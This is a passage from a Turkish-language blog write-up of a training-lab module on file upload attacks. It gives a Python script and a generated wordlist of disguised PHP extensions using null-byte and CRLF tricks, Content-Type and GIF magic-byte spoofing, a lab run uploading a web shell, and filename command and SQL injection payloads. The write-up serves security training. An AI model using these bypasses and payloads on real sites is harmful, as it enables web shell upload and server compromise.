+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> uzanti <span class="keyword">in</span> <span class="string">&quot;.pht&quot;</span>, <span class="string">&quot;.phtml&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;%20&#x27;</span>, <span class="string">&#x27;%0a&#x27;</span>, <span class="string">&#x27;%00&#x27;</span>, <span class="string">&#x27;%0d0a&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.\\&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;…&#x27;</span>, <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;shell<span class="subst">&#123;uzanti&#125;</span><span class="subst">&#123;char&#125;</span>.jpg&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;shell<span class="subst">&#123;char&#125;</span><span class="subst">&#123;uzanti&#125;</span>.jpg&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;shell.jpg<span class="subst">&#123;uzanti&#125;</span><span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;shell.jpg<span class="subst">&#123;char&#125;</span><span class="subst">&#123;uzanti&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Şu listeyi elde ettim:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">shell.pht%20.jpg</span><br><span class="line">shell%20.pht.jpg</span><br><span class="line">shell.jpg.pht%20</span><br><span class="line">shell.jpg%20.pht</span><br><span class="line">shell.pht%0a.jpg</span><br><span class="line">shell%0a.pht.jpg</span><br><span class="line">shell.jpg.pht%0a</span><br><span class="line">shell.jpg%0a.pht</span><br><span class="line">shell.pht%00.jpg</span><br><span class="line">shell%00.pht.jpg</span><br><span class="line">shell.jpg.pht%00</span><br><span class="line">shell.jpg%00.pht</span><br><span class="line">shell.pht%0d0a.jpg</span><br><span class="line">shell%0d0a.pht.jpg</span><br><span class="line">shell.jpg.pht%0d0a</span><br><span class="line">shell.jpg%0d0a.pht</span><br><span class="line">shell.pht/.jpg</span><br><span class="line">shell/.pht.jpg</span><br><span class="line">shell.jpg.pht/</span><br><span class="line">shell.jpg/.pht</span><br><span class="line">shell.pht.\.jpg</span><br><span class="line">shell.\.pht.jpg</span><br><span class="line">shell.jpg.pht.\</span><br><span class="line">shell.jpg.\.pht</span><br><span class="line">shell.pht..jpg</span><br><span class="line">shell..pht.jpg</span><br><span class="line">shell.jpg.pht.</span><br><span class="line">shell.jpg..pht</span><br><span class="line">shell.pht….jpg</span><br><span class="line">shell….pht.jpg</span><br><span class="line">shell.jpg.pht…</span><br><span class="line">shell.jpg….pht</span><br><span class="line">shell.pht:.jpg</span><br><span class="line">shell:.pht.jpg</span><br><span class="line">shell.jpg.pht:</span><br><span class="line">shell.jpg:.pht</span><br><span class="line">shell.phtml%20.jpg</span><br><span class="line">shell%20.phtml.jpg</span><br><span class="line">shell.jpg.phtml%20</span><br><span class="line">shell.jpg%20.phtml</span><br><span class="line">shell.phtml%0a.jpg</span><br><span class="line">shell%0a.phtml.jpg</span><br><span class="line">shell.jpg.phtml%0a</span><br><span class="line">shell.jpg%0a.phtml</span><br><span class="line">shell.phtml%00.jpg</span><br><span class="line">shell%00.phtml.jpg</span><br><span class="line">shell.jpg.phtml%00</span><br><span class="line">shell.jpg%00.phtml</span><br><span class="line">shell.phtml%0d0a.jpg</span><br><span class="line">shell%0d0a.phtml.jpg</span><br><span class="line">shell.jpg.phtml%0d0a</span><br><span class="line">shell.jpg%0d0a.phtml</span><br><span class="line">shell.phtml/.jpg</span><br><span class="line">shell/.phtml.jpg</span><br><span class="line">shell.jpg.phtml/</span><br><span class="line">shell.jpg/.phtml</span><br><span class="line">shell.phtml.\.jpg</span><br><span class="line">shell.\.phtml.jpg</span><br><span class="line">shell.jpg.phtml.\</span><br><span class="line">shell.jpg.\.phtml</span><br><span class="line">shell.phtml..jpg</span><br><span class="line">shell..phtml.jpg</span><br><span class="line">shell.jpg.phtml.</span><br><span class="line">shell.jpg..phtml</span><br><span class="line">shell.phtml….jpg</span><br><span class="line">shell….phtml.jpg</span><br><span class="line">shell.jpg.phtml…</span><br><span class="line">shell.jpg….phtml</span><br><span class="line">shell.phtml:.jpg</span><br><span class="line">shell:.phtml.jpg</span><br><span class="line">shell.jpg.phtml:</span><br><span class="line">shell.jpg:.phtml</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi bu listeyi kullanarak fuzz’lama yapalım:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2017.png" alt="Untitled"></p>
+<p>Uzunluğu 193 olanlar başarıyla yüklendi. Şimdi başarılı olanlardan herhangi birisini seçerek karşı tarafa yükleme yapalım. </p>
+<p>Bir tanesini denedim ancak çalışmadı. Bu da uzantı tamam olsa da yine de php kodunun çalışmayabileceği anlamına geliyor. O yüzden hepsi çalışmadığı için script’in kendisini yükledim ve uzantı fuzz’lamasını o dosyanın kendisine yaptım. Böylece dosyaları teker teker yüklememe gerek kalmadı. Sonuç olarak çalışan bir tanesini buldum:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2018.png" alt="Untitled"></p>
+<hr>
+<h1 id="Type-Filters"><a href="#Type-Filters" class="headerlink" title="Type Filters"></a>Type Filters</h1><h2 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h2><p>Tip filtrelemesi bu zamana kadar öğrendiğimiz tüm yöntemleri boşa çıkarabilir. Çünkü giden HTTP isteğinde dosyamızın ne tür bir içerik türüne sahip olduğu belirtilir ve bu unsur filtrelemeden geçiriliyorsa o biz ne kadar dosya uzantısını değiştirirsek değiştirelim yine de işe yaramaz. O yüzden yapılacak iş HTTP isteğini düzenlemektir. Örnek bir php kodu inceleyerek bu content-type başlığının nasıl filtrelendiğini inceleyelim:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>, <span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>))) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Only images are allowed&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Web tarayıcılarımız tarafından dosya yüklenirken bu tip otomatik olarak belirlense de bu işlem bir kullanıcı tarafı işlemidir yani bizim kontrolümüz altındadır. Tip fuzz’laması yaparak hangi içerik tipinin onaylanıp hangilerinin onaylanmayacağını belirleyebiliriz. Bunun için uygun wordlist: <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt</a></p>
+<p>Biz halihazırda resimlerle işlem yapacağımızı bildiğimiz için yukarıdaki dosyadan yalnızca resim içeren başlıkları alalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> content-type.txt | grep <span class="string">&#x27;image/&#x27;</span> &gt; image-content-types.txt</span><br></pre></td></tr></table></figure>
+
+<p>Basit olması açısından işe yarayan bir tane tipi seçelim ve .php dosyamızın başlığı olarak ekleyelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2019.png" alt="Untitled"></p>
+<p>Yukarıda da görüldüğü üzere içeriğinde bir php kodu barındırıyor olsa da <code>Content-Type</code> geçerli bir değer olan image&#x2F;jpg barındırdığı için filtreden geçebilmiş oldu.</p>
+<div class="note info flat"><p>🌐 <strong>Note:</strong> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file’s Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as <code>POST</code> data), in which case we will need to modify the main Content-Type header.</p>
+</div>
+
+<h2 id="MIME-Type"><a href="#MIME-Type" class="headerlink" title="MIME Type"></a>MIME Type</h2><p>MIME Tipi dosyanın hangi unsurla başladığına bakar. Örneğin eğer düz yazı ile başlıyorsa bu bir txt dosyasıdır. Ya da bir <code>GIF</code> dosyası ise en başında <code>GIF98</code> gibi o dosyanın ne tür bir unsur olduğunu tanımlayan bir ibare bulunur. Dosyamızın adı shell.php olsa da başlangıcında GIF98 yazdığı için karşı sitedeki filtre bunu bir gif dosyası zanneder ve o dosyayı kabul eder.</p>
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a></p>
+<p>Yukarıdaki link üzerinden dosya türlerinin nasıl bir MIME tipine sahip olduğu öğrenilebilir. Bu MIME tipini değiştirerek o dosyanın algılanma biçimini değiştirebiliriz ve bu sayede filtreleri atlatabiliriz. Web serverlar daha kesin sonuçlar verdiği için .jpg gibi uzantılara bakmak yerine bu MIME tipi filtrelemesini uygularlar. </p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2020.png" alt="Untitled"></p>
+<p>Yukarıdaki şekilde content-type’ı image&#x2F;jpg olarak ayarladık ve 16. satırda görülebileceği üzere, dosya başlangıcını GIF8 ile yaptık. İkisi bire bir eşdeğer olmasa da filtrelemeden her ikisi de geçtiği için bize olumlu bir yanıt dönmektedir:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2021.png" alt="Untitled"></p>
+<p>İncelediğimiz bu iki tip filtrelemesi yöntemi birleştirilerek ya da farklı farklı şekillerde kullanılarak çözüm aranabilir.</p>
+<hr>
+<p><strong>Ufak bir vaka çalışması:</strong></p>
+<p><strong>The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at “&#x2F;flag.txt”</strong></p>
+<ul>
+<li>Öncelikle içerisinde jpg ve engellenmeyen bir php uzantısı barındıran bir kombinasyon oluşturmalıyım.</li>
+<li>Sonrasında content-type images&#x2F;jpg olmalı.</li>
+<li>MIME tipini de GIF olarak ayarlarım ve işlem tamamlanır.</li>
+</ul>
+<p>Kabul edilen php uzantıları .pht ve .phtml olmakta:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2022.png" alt="Untitled"></p>
+<p>Sonrasında repeater’den intruder’a geçtim ve dosya içeriği hazır olduğu için uzantı fuzz’laması yapacağız sadece.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2023.png" alt="Untitled"></p>
+<p>Ancak bu işe yaramadı. Muhtemelen Content-Type kısmındaki bir filtreye takıldık. O yüzden hali hazırda geçerli bir dosya yüklerken content-type filtrelemesini bir gerçekleştirelim.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2024.png" alt="Untitled"></p>
+<p>Görüldüğü üzere image&#x2F;gif, image&#x2F;jpeg ve image&#x2F;png kabul edilmekte. Daha önceki saldırımızı bu üç content tipinden birisini kullanarak yeniden düzenleyelim.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2025.png" alt="Untitled"></p>
+<p>En sonunda shellcik.jpg.phtml işe yaradı. Web shell attım içerisine, çalıştı ancak tam %100 iyi çalışmıyordu. Yine de flag’i elde ettik.</p>
+<hr>
+<h2 id="Bazi-Diger-Saldiri-Turleri"><a href="#Bazi-Diger-Saldiri-Turleri" class="headerlink" title="Bazı Diğer Saldırı Türleri"></a>Bazı Diğer Saldırı Türleri</h2><ul>
+<li>Dosya ismine enjeksiyon: <code>file$(whoami).jpg</code> ya da <code>file</code>whoami<code>.jpg</code> ya da <code>file.jpg||whoami</code> şeklinde dosya isminin kendisinde bir komut bulunmasıdır. Bu yöntem xss ve sqli için de uygulanabilir. Ör: <code>file&#39;;select+sleep(5);--.jpg</code></li>
+<li>Server error’ları oluşturmak: 5000 karakterden uzun dosya ismi, aynı dosyayı iki defa yüklemek vb.</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://fhk0.github.io">fhk0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://fhk0.github.io/2022/09/16/File-Upload-Attacks/">https://fhk0.github.io/2022/09/16/File-Upload-Attacks/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg" data-sites="facebook, twitter, linkedin"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/16/Login-Brute-Forcing/"><img class="prev-cover" src="/img/content-images/htb-academy/Login%20Brute%20Forcing%20e7d1108ee8b549c085496b59363951fd/loginbruteforcing.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Login Brute Forcing</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/16/Command-Injections/"><img class="next-cover" src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/commandinjection.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Command Injections</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mrrobot.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">fhk0</div><div class="author-info__description">Web Application Pentester</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FHK0"><i class="fab fa-github"></i><span>Follow Me on GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://www.linkedin.com/in/firathilmikaplan/" target="_blank" title="Linkedin"><i class="fa-brands fa-linkedin"></i></a><a class="social-icon" href="https://medium.com/@fhk0" target="_blank" title="Medium"><i class="fa-brands fa-medium"></i></a><a class="social-icon" href="https://www.youtube.com/channel/UCik9LW_i9-h2NKVrs6180ng" target="_blank" title="YouTube"><i class="fa-brands fa-youtube"></i></a><a class="social-icon" href="https://www.hackerrank.com/fhk0x" target="_blank" title="HackerRank"><i class="fa-brands fa-hackerrank"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Hey! I'm currently solving PortSwigger Labs. I'll share the solutions of them soon.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Absent-Validation"><span class="toc-number">1.</span> <span class="toc-text">Absent Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">1.1.</span> <span class="toc-text">Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filtrelemeleri-Atlatmak"><span class="toc-number">2.</span> <span class="toc-text">Filtrelemeleri Atlatmak</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Back-end-Request-Modification"><span class="toc-number">2.1.</span> <span class="toc-text">Back-end Request Modification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Disabling-Front-end-Validation"><span class="toc-number">2.2.</span> <span class="toc-text">Disabling Front-end Validation</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dosya-Uzantisi-Bloklandigi-Zaman-Ne-Yapacagiz"><span class="toc-number">3.</span> <span class="toc-text">Dosya Uzantısı Bloklandığı Zaman Ne Yapacağız?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Whitelist-Filters"><span class="toc-number">3.1.</span> <span class="toc-text">Whitelist Filters</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Type-Filters"><span class="toc-number">4.</span> <span class="toc-text">Type Filters</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Type"><span class="toc-number">4.1.</span> <span class="toc-text">Content-Type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIME-Type"><span class="toc-number">4.2.</span> <span class="toc-text">MIME Type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bazi-Diger-Saldiri-Turleri"><span class="toc-number">4.3.</span> <span class="toc-text">Bazı Diğer Saldırı Türleri</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Inclusion/" title="File Inclusion"><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Inclusion"/></a><div class="content"><a class="title" href="/2022/09/16/File-Inclusion/" title="File Inclusion">File Inclusion</a><time datetime="2022-09-16T05:24:50.000Z" title="Created 2022-09-16 08:24:50">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Web-Attacks/" title="Web Attacks"><img src="/img/content-images/htb-academy/Web%20Attacks%20219f9e2baec741e9a0cba7f5c82486d5/webattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/Web-Attacks/" title="Web Attacks">Web Attacks</a><time datetime="2022-09-16T05:24:41.000Z" title="Created 2022-09-16 08:24:41">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication"><img src="/img/content-images/htb-academy/Broken%20Authentication%2097c8a4f364d34faba8206ba43cd5143f/brokenauth.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Broken Authentication"/></a><div class="content"><a class="title" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication">Broken Authentication</a><time datetime="2022-09-16T05:24:30.000Z" title="Created 2022-09-16 08:24:30">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing"><img src="/img/content-images/htb-academy/Login%20Brute%20Forcing%20e7d1108ee8b549c085496b59363951fd/loginbruteforcing.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Login Brute Forcing"/></a><div class="content"><a class="title" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing">Login Brute Forcing</a><time datetime="2022-09-16T05:24:17.000Z" title="Created 2022-09-16 08:24:17">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks"><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Upload Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks">File Upload Attacks</a><time datetime="2022-09-16T05:24:05.000Z" title="Created 2022-09-16 08:24:05">2022-09-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By fhk0</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,0" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
